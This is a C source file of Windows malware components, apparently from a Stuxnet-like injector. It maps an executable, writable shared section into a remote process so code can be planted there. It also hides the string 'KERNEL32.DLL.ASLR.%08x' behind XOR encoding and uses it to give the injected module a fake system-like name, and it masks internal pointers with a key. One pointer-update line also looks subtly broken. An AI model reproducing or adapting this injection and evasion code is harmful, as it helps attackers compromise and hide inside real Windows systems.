#include "Utils.h"
#include "AssemblyBlock2.h"
#include "EncodingAlgorithms.h"
#include "CodeBlock.h"

#include "config.h"
#include "define.h"

INT32 
SharedMapViewOfSection
(HANDLE hRemote,
 SIZE_T nSize,
 PHANDLE ppSection,
 PVOID *ppLocal,
 PVOID *ppRemote)
{
	SIZE_T iViewSize;
	NTSTATUS nRet;
	LARGE_INTEGER liMaxSize;

	iViewSize = nSize;
	
	liMaxSize.LowPart  = nSize;
	liMaxSize.HighPart = 0;
	
	nRet = _F(ZwCreateSection)(ppSection, SECTION_ALL_ACCESS, NULL, &liMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0);
	HAS_FAILED(nRet, -5)
	
	nRet = _F(ZwMapViewOfSection)(*ppSection, GetCurrentProcess(), ppLocal , NULL, 0, NULL, &iViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
	HAS_FAILED(nRet, -5)
	
	nRet = _F(ZwMapViewOfSection)(*ppSection, hRemote            , ppRemote, NULL, 0, NULL, &iViewSize, ViewShare, 0, PAGE_EXECUTE_READWRITE);
	HAS_FAILED(nRet, -5)
	
	return 0;
}

void 
CopySegmentIntoSections
(PVOID *ppLocal,
 PVOID lpRemote,
 INT32 *nGlobalPtr,
 PSECTION_SEGEMENT_INFO lpRemoteInfo,
 PVOID lpBytes,
 DWORD dwSize)
{
	if(dwSize)
		__memcpy(*ppLocal, lpBytes, dwSize);
	
	lpRemoteInfo->SegmentAddress = (DWORD)lpRemote + *nGlobalPtr;
	lpRemoteInfo->SegmentSize = dwSize;
	
	*ppLocal  = ppLocal + dwSize;
	*nGlobalPtr += dwSize;
}

const 
WORD 
ENCODED_KERNEL32_DLL_ASLR__08x[23] =
{
	0xAE59, 0xAE57, 0xAE40, 0xAE5C,
	0xAE57, 0xAE5E, 0xAE21, 0xAE20,
	0xAE3C, 0xAE56, 0xAE5E, 0xAE5E,
	0xAE3C, 0xAE53, 0xAE41, 0xAE5E,
	0xAE40, 0xAE3C, 0xAE37, 0xAE22,
	0xAE2A, 0xAE6A, 0xAE12
};

INT32 
GetRandomModuleName
(GENERAL_INFO_BLOCK *lpInfoBlock,
 LPCWSTR lpszLibraryName)
{
	WCHAR __KERNEL32_DLL_ASLR_08x[42];
	DWORD dwRandom;

	if(lpszLibraryName)
	{
		if(lstrlenW(lpszLibraryName) >= 31)
			return -1;
		
		lstrcpyW(lpInfoBlock->RandomLibraryName, lpszLibraryName);
	}
	else
	{
		dwRandom = GetTickCount() + 3 * GetCurrentThreadId();
		DecodeModuleNameW(ENCODED_KERNEL32_DLL_ASLR__08x, __KERNEL32_DLL_ASLR_08x);
		
		do
			wsprintfW(lpInfoBlock->RandomLibraryName, __KERNEL32_DLL_ASLR_08x, dwRandom++);
		while(GetModuleHandleW(lpInfoBlock->RandomLibraryName));
	}
	
	lpInfoBlock->OriginalAddress = (DWORD)lpInfoBlock ^ X_PTR_KEY;
	lpInfoBlock->UnknownZero0 = 0;
	lpInfoBlock->AlignAddressesFunction = (DWORD)BLOCK4_AlignAddresses;
	
	return 0;
}